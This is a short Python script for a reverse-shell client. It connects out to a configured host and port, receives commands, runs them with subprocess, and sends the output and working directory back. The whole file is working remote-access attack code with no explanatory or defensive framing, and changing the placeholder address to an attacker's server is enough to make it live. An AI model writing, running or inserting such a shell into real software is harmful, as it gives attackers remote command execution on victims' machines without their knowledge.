import socket
import os
import subprocess
import sys

''' TODO: Move this to a .env? '''
SERVER_HOST = '127.0.0.1'
SERVER_PORT = 443
BUFFER_SIZE = 1024 * 128 # 128KB max mesxage
SEPARATOR = '<sep>'

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))
cwd = os.getcwd()
s.send(cwd.encode())

while True:
    command = s.recv(BUFFER_SIZE).decode()
    split_command = command.split()
    if command.lower() == 'exit':
        break
    if split_command[0].lower() == 'cd':
        try:
            os.chdir(' '.join(split_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ''
    else:
        output = subprocess.getoutput(command)
    cwd = os.getcwd()
    message = f'{output}{SEPARATOR}{cwd}'
    s.send(message.encode())
s.close()